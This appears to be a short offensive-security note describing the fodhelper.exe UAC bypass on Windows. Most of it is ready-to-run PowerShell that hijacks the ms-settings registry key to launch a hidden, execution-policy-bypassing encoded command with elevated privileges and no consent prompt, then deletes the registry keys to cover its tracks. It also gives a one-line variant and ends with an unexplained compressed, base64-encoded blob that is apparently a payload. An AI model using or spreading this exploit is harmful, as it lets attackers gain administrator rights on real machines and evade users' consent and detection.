# Theory

> Unlock hidden doors with trust as your key

### Vulnerability

fodhelper.exe itself does not execute registry keys per se; However, it reads certain registry keys to determine its behavior. By misusing the "ms-settings" key, we can potentially get fodhelper to run values within a key

fodhelper.exe is designed to run with elevated privileges without prompting the user with a uac

### Raw Payload

```Powershell
$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command"
reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f

fodhelper.exe

Start-Sleep -s 3
reg delete "HKCU\Software\Classes\.hacker\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
or
```Powershell
$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.hacker\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
```



```
H4sIAP+TIWYC/4WPsW7CMBRFf+XJymoydERdmhYCbYESFRYvjn1DADexbLdJ+XpIBFLLAMub7r3nvGg0nm7nSJfPH+/tstk/Mls3cL6EMQO0IN5QSXxWL7pTTYi/tFD09Gul98RRKYp+xjI/rHfqbZev2dBhQ1JrYulr8imyugiNdBCJORXgxaCUag8nso4g5haV+NenWFN0JUVxcW/2y3OPELbVxovk263g+iV2xrFuoqj1CWrhuseGWZAu8MwAlrinh56gYRBwz51dhG7H/zr1lSNEJGlObQEAAA==
```
